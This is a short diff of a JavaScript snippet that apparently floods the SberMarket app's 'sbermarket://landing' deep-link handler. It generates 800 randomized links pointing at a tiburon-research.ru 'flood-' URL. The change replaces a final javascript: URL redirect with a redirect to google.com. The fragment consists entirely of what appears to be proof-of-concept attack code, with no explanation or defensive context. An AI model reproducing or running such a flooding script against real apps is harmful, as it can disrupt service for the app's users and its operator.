@@ -5,4 +5,4 @@ for(let i=0; i<800; i++) {
   data: 'sbermarket://landing?url=https://tiburon-research.ru/flood-' + i + '-' + Date.now() + '-' + Math.random().toString(36).substr(2)
   }));
 }
-window.location = "javascript:'<html><body><h1>Новая страница</h1></body></html>'";
+window.location = "https://google.com";
